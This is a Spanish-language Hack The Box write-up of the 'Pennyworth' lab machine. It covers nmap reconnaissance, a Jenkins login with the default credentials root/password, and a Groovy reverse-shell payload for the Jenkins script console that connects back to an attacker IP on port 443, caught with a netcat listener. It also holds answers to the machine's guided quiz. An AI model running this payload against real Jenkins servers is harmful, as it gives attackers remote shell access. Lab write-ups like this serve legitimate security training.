---
title: Writeup pennyworth - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - pennyworth
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina pennyworth en Hack The Box.
keywords:
  - writeup pennyworth
  - hack the box pennyworth
  - resolución máquina pennyworth
  - pennyworth hack the box
  - htb pennyworth
---
----------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+1/Linux/Pennyworth)
- 📺 **Resolución en vivo (completa)**: [Link]([Link](https://www.youtube.com/watch?v=vC5kp8ODqls))
- 🧠 **Explicación resumida**: 

--------

#veryeasy #linux #nmap #ping #groovy #reverseshell

----
# Guided Mode

1)¿Qué significan las siglas CVE?
	Common Vulnerabilities and Exposures

2)¿Qué significan las tres letras de CIA, en referencia a la tríada de la CIA en ciberseguridad?
	Confidentiality, Integrity, Availability

3)¿Cuál es la versión del servicio que se ejecuta en el puerto 8080?
	Jetty 9.4.39.v20210325

4)¿Qué versión de Jenkins se está ejecutando en el objetivo?
	Jenkins[2.289.1]

5)¿Qué tipo de script se acepta como entrada en la Consola de Script de Jenkins?
	groovy

6)¿A qué equivaldría la variable «String cmd» del fragmento de Groovy Script si la máquina virtual de destino estuviera ejecutando Windows?
	cmd.exe

7)¿Cuál es un comando diferente a «ip a» que podríamos usar para mostrar la información de nuestras interfaces de red en Linux?
	ifconfig

8)¿Qué switch debemos utilizar con netcat para que utilice el modo de transporte UDP?
	-u

9)¿Cuál es el término utilizado para describir cómo hacer que un host de destino inicie una conexión de vuelta al host atacante?
	reverse shell

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.255.235
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.255.235 -oG allports
nmap -sCV -p8080 10.129.255.235 -oN target
```

![[Pennyworth1.png]]

![[Pennyworth2.png]]
*TTL:* Maquina Linux
*Puertos:*
	`8080` HTTP

-------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.129.255.235:8080
```

![[Pennyworth3.png]]
La unica informacion relevante es lo de jetty 9.4.39 que vimos tambien en nmap

----
# Intrusion al panel de logeo

Entramos a la pagina y vemos este panel de logeo
![[Pennyworth4.png]]
Despues de intentar los usuarios y contraseñas mas comunes, logramos dar con 
```
Usuario: root
Contraseña: password
```

Ya estamos adentro
![[Pennyworth5.png]]

---------
# [[Reverse shell]]
Ahora vamos a ir a la parte de consola y vamos a poner el payload que sacamos de este [articulo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)
![[Pennyworth7.png]]
#### Payload
```groovy
String host="10.10.16.16";
int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Mientras estamos en escucha con [[nc -nlvp 443]], y no se le dan importancia a los errores de la consola de groovy por que igualemnte no tira la revershell, una vez dentro ya podemos catear la flag

![[Pennyworth6.png]]

--------
# Notas

Confidentiality, Integrity, Availability
	La tríada CIA en ciberseguridad representa **Confidencialidad, Integridad y Disponibilidad**. Son los tres pilares fundamentales para proteger la información: evitar accesos no autorizados, mantener los datos correctos y asegurarse de que estén siempre accesibles.


--------
# Creditos
Writeup Oficial HackTheBox


